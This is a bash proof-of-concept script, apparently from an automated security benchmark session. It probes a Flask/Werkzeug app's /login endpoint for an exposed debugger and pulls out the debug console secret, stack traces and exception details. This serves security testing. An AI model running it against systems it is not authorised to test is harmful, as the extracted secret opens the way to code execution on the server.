#!/bin/bash
# POC: Demonstrates Werkzeug debugger enabled with exposed debug console secret on /login endpoint
# Target: ./repo
# Created: 2025-11-05T16:45:17.811Z
# Session: benchmark-XBEN-032-24-mhm7iwy4

# Werkzeug Debugger Exposed - POC
# This script demonstrates accessing the Werkzeug debug console and extracting the debug secret

TARGET="${1:-http://localhost}"
LOGIN_ENDPOINT="${TARGET}/login"
DEBUG_SECRET_PATTERN='SECRET = "([^"]+)"'

echo "[*] Werkzeug Debugger Exposure POC"
echo "[*] Target: ${TARGET}"
echo ""

# Step 1: Trigger an error on the login endpoint
echo "[*] Step 1: Triggering error on ${LOGIN_ENDPOINT}"
RESPONSE=$(curl -s -X POST "${LOGIN_ENDPOINT}" \
  -d "username=admin&password=password" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -v 2>&1)

echo "[*] Step 2: Analyzing response for debug information..."
echo ""

# Check if Werkzeug error page is present
if echo "${RESPONSE}" | grep -q "Werkzeug"; then
    echo "[+] VULNERABLE: Werkzeug debug page detected"
else
    echo "[-] No Werkzeug debug page found in response"
fi

# Check for debug console secret
if echo "${RESPONSE}" | grep -q "SECRET = "; then
    SECRET=$(echo "${RESPONSE}" | grep -oP 'SECRET = "\K[^"]+' | head -1)
    echo "[+] CRITICAL: Debug console secret exposed: ${SECRET}"
else
    echo "[-] Debug console secret not found"
fi

# Check for debugger resource links
if echo "${RESPONSE}" | grep -q "__debugger__"; then
    echo "[+] CRITICAL: Debugger resource links detected (__debugger__ parameter found)"
    DEBUGGER_LINKS=$(echo "${RESPONSE}" | grep -o "__debugger__[^\"]*" | head -5)
    echo "[+] Sample debugger links:"
    echo "${DEBUGGER_LINKS}" | sed 's/^/    /'
else
    echo "[-] No debugger resource links found"
fi

# Check for stack trace information
if echo "${RESPONSE}" | grep -q "File.*line" || echo "${RESPONSE}" | grep -q "Traceback"; then
    echo "[+] CRITICAL: Stack trace with file paths detected"
else
    echo "[-] No stack trace information found"
fi

# Check for variable exposure
if echo "${RESPONSE}" | grep -q -i "locals\|variables"; then
    echo "[+] WARNING: Local variables or scope information exposed"
else
    echo "[-] No local variable exposure detected"
fi

# Check for exception details
if echo "${RESPONSE}" | grep -q "BadRequestKeyError\|Exception\|Error:"; then
    EXCEPTION=$(echo "${RESPONSE}" | grep -oP '(?:<title>|Exception: )\K[^<]+' | head -1)
    echo "[+] WARNING: Exception details exposed: ${EXCEPTION}"
else
    echo "[-] No exception details found"
fi

echo ""
echo "[*] POC Complete"